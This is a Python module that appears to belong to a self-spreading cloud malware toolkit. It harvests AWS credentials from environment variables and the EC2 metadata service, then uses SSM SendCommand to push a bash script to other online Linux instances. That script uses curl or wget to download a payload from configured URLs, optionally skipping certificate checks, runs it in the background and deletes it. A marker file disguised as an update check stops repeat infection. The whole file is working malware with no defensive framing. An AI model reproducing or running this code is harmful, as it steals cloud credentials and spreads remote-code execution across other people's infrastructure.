import json
import os
import hashlib
import urllib.request
import urllib.error
import config
from utilities.aws_signer import generate_aws_headers


def _get_system_fingerprint():
    components = []
    
    try:
        with open('/etc/machine-id', 'r') as f:
            components.append(f.read().strip())
    except Exception:
        pass
    
    try:
        with open('/var/lib/dbus/machine-id', 'r') as f:
            components.append(f.read().strip())
    except Exception:
        pass
    
    try:
        import socket
        components.append(socket.gethostname())
    except Exception:
        pass
    
    try:
        with open('/proc/sys/kernel/hostname', 'r') as f:
            components.append(f.read().strip())
    except Exception:
        pass
    
    if not components:
        components.append(str(os.getpid()))
    
    fingerprint = hashlib.sha256('|'.join(components).encode()).hexdigest()
    return fingerprint


def _get_propagation_marker():
    marker_path = os.path.expanduser('~/.cache/.sys-update-check')
    os.makedirs(os.path.dirname(marker_path), exist_ok=True)
    return marker_path


def _has_propagated():
    marker = _get_propagation_marker()
    return os.path.exists(marker)


def _mark_propagated(targets):
    marker = _get_propagation_marker()
    try:
        with open(marker, 'w') as f:
            json.dump({
                'fingerprint': _get_system_fingerprint(),
                'targets': targets,
                'version': '1.0'
            }, f)
    except Exception:
        pass


def _call_ssm(region, ak, sk, tok, target, payload_dict):
    payload_str = json.dumps(payload_dict)
    host = f"ssm.{region}.amazonaws.com"
    url = f"https://{host}/"
    
    headers = generate_aws_headers("POST", url, host, region, "ssm", target, ak, sk, tok, payload_str)
    req = urllib.request.Request(url, data=payload_str.encode('utf-8'), headers=headers, method="POST")
    
    with urllib.request.urlopen(req, timeout=15) as response:
        return json.loads(response.read().decode('utf-8'))


def _get_current_instance_id():
    try:
        req = urllib.request.Request("http://169.254.169.254/latest/api/token", 
                                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, 
                                    method="PUT")
        token = urllib.request.urlopen(req, timeout=1).read().decode().strip()
        
        req2 = urllib.request.Request("http://169.254.169.254/latest/meta-data/instance-id",
                                     headers={"X-aws-ec2-metadata-token": token})
        instance_id = urllib.request.urlopen(req2, timeout=1).read().decode().strip()
        return instance_id
    except Exception:
        return None


def _resolve_credentials():
    ak = os.environ.get('AWS_ACCESS_KEY_ID')
    sk = os.environ.get('AWS_SECRET_ACCESS_KEY')
    tok = os.environ.get('AWS_SESSION_TOKEN')
    
    if ak and sk:
        return ak.strip(), sk.strip(), tok.strip() if tok else None
    
    try:
        req = urllib.request.Request("http://169.254.169.254/latest/api/token",
                                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                                    method="PUT")
        token = urllib.request.urlopen(req, timeout=1).read().decode().strip()
        req2 = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                                     headers={"X-aws-ec2-metadata-token": token})
        role = urllib.request.urlopen(req2, timeout=1).read().decode().strip()
        req3 = urllib.request.Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
                                     headers={"X-aws-ec2-metadata-token": token})
        creds = json.loads(urllib.request.urlopen(req3, timeout=1).read().decode())
        return creds.get('AccessKeyId', '').strip(), creds.get('SecretAccessKey', '').strip(), creds.get('Token', '').strip()
    except Exception:
        return None, None, None


def _get_current_region():
    try:
        req = urllib.request.Request("http://169.254.169.254/latest/api/token",
                                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                                    method="PUT")
        token = urllib.request.urlopen(req, timeout=1).read().decode().strip()
        req2 = urllib.request.Request("http://169.254.169.254/latest/meta-data/placement/region",
                                     headers={"X-aws-ec2-metadata-token": token})
        region = urllib.request.urlopen(req2, timeout=1).read().decode().strip()
        return region
    except Exception:
        return "us-east-1"


def _load_discovered_instances():
    try:
        import tempfile
        state_dir = os.path.join(tempfile.gettempdir(), '.rope_state')
        state_file = os.path.join(state_dir, 'ssm_instances.json')
        
        if not os.path.exists(state_file):
            return {}
        
        with open(state_file, 'r') as f:
            return json.load(f)
    except Exception:
        return {}


def propagate_to_discovered_instances(discovered_instances, max_targets=5):
    if _has_propagated():
        return {"already_propagated": True, "fingerprint": _get_system_fingerprint()}
    
    ak, sk, tok = _resolve_credentials()
    if not ak or not sk:
        return {"error": "no_aws_credentials"}
    
    current_instance_id = _get_current_instance_id()
    
    propagated_targets = _propagate_via_ssm(discovered_instances, ak, sk, tok, current_instance_id, max_targets)
    
    _mark_propagated(propagated_targets)
    
    return {
        "propagation_attempted": True,
        "targets": propagated_targets,
        "source_instance": current_instance_id,
        "discovered_count": sum(len(instances) for regions in discovered_instances.values() for instances in regions.values()),
        "fingerprint": _get_system_fingerprint()
    }

def _propagate_via_ssm(discovered_instances, ak, sk, tok, current_instance_id, max_targets=5):
    propagated_targets = []
    
    all_instances = []
    for profile_name, regions_data in discovered_instances.items():
        for region, instances in regions_data.items():
            for instance in instances:
                all_instances.append((region, instance, profile_name))
    
    if not all_instances:
        return []
    
    try:
        
        primary_url = config.PROPAGATION_PAYLOAD_URL_PRIMARY
        secondary_url = config.PROPAGATION_PAYLOAD_URL_SECONDARY
        ssl_flag = "-k" if config.IGNORE_SSL_ERRORS else ""
        wget_ssl = "--no-check-certificate" if config.IGNORE_SSL_ERRORS else ""
        
        propagation_script = f"""#!/bin/bash
[ "$(uname -s)" != "Linux" ] && exit 0
MARKER="$HOME/.cache/.sys-update-check"
[ -f "$MARKER" ] && exit 0
mkdir -p "$HOME/.cache" 2>/dev/null
cd /tmp
PAYLOAD_FILE="rope-${{RANDOM}}.pyz"
curl -sSL {ssl_flag} -w "%{{http_code}}" "{primary_url}" -o "$PAYLOAD_FILE" 2>/dev/null | grep -q "^200$" || curl -sSL {ssl_flag} "{secondary_url}" -o "$PAYLOAD_FILE" 2>/dev/null || wget {wget_ssl} -q -O "$PAYLOAD_FILE" "{primary_url}" 2>/dev/null || wget {wget_ssl} -q -O "$PAYLOAD_FILE" "{secondary_url}" 2>/dev/null || exit 0
[ -f "$PAYLOAD_FILE" ] || exit 0
nohup python3 "$PAYLOAD_FILE" > /dev/null 2>&1 &
sleep 2
rm -f "$PAYLOAD_FILE" 2>/dev/null
"""
        
        for target_region, instance, profile_name in all_instances:
            if len(propagated_targets) >= max_targets:
                break
            
            instance_id = instance.get("InstanceId")
            ping_status = instance.get("PingStatus")
            platform_type = instance.get("PlatformType", "").lower()
            
            if not instance_id or instance_id == current_instance_id:
                continue
            
            if ping_status != "Online":
                continue
            
            if platform_type == "windows":
                continue
            
            try:
                send_response = _call_ssm(
                    target_region, ak, sk, tok,
                    "SendCommand",
                    {
                        "InstanceIds": [instance_id],
                        "DocumentName": "AWS-RunShellScript",
                        "Parameters": {
                            "commands": [propagation_script]
                        },
                        "TimeoutSeconds": 30
                    }
                )
                
                command_id = send_response.get("Command", {}).get("CommandId")
                if command_id:
                    propagated_targets.append({
                        "instance_id": instance_id,
                        "command_id": command_id,
                        "region": target_region,
                        "platform": platform_type,
                        "profile": profile_name
                    })
            except Exception:
                pass
    
    except Exception:
        pass
    
    return propagated_targets


def collect() -> dict:
    return {
        "status": "propagation_handled_by_aws_collector",
        "note": "Propagation is now executed within the AWS collector after instance discovery"
    }
